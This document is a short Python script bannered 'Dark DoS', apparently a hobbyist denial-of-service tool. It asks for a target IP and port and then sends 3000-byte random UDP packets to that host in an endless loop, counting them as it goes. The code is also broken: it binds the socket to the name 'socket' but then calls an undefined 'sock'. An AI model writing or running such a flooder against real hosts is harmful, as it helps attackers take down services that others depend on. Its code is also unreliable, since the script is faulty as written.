import sys
import socket
import random
import os


os.system("clear")

banner="""

                                                                                                  
    ,---,                              ,-.             ,---,                                      
  .'  .' `\                        ,--/ /|           .'  .' `\        ,---,                       
,---.'     \              __  ,-.,--. :/ |         ,---.'     \     ,---.'|   ,---.               
|   |  .`\  |           ,' ,'/ /|:  : ' /          |   |  .`\  |    |   | :  '   ,'\   .--.--.    
:   : |  '  |  ,--.--.  '  | |' ||  '  /           :   : |  '  |    |   | | /   /   | /  /    '   
|   ' '  ;  : /       \ |  |   ,''  |  :           |   ' '  ;  :  ,--.__| |.   ; ,. :|  :  /`./   
'   | ;  .  |.--.  .-. |'  :  /  |  |   \          '   | ;  .  | /   ,'   |'   | |: :|  :  ;_     
|   | :  |  ' \__\/: . .|  | '   '  : |. \         |   | :  |  '.   '  /  |'   | .; : \  \    `.  
'   : | /  ;  ," .--.; |;  : |   |  | ' \ \        '   : | /  ; '   ; |:  ||   :    |  `----.   \ 
|   | '` ,/  /  /  ,.  ||  , ;   '  : |--'         |   | '` ,/  |   | '/  ' \   \  /  /  /`--'  / 
;   :  .'   ;  :   .'   \---'    ;  |,'            ;   :  .'    |   :    :|  `----'  '--'.     /  
|   ,.'     |  ,     .-./        '--'              |   ,.'       \   \  /              `--'---'   
'---'        `--`---'                              '---'          `----'                         

"""
print(banner)


bytes = random._urandom(3000)
socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

ip = raw_input("Target IP :")
port = input("Port        :")

sent = 0 

while True:
    sock.sendto(bytes, (ip,port))
    sent = sent+1
    print("packages sent :%s"%(sent))
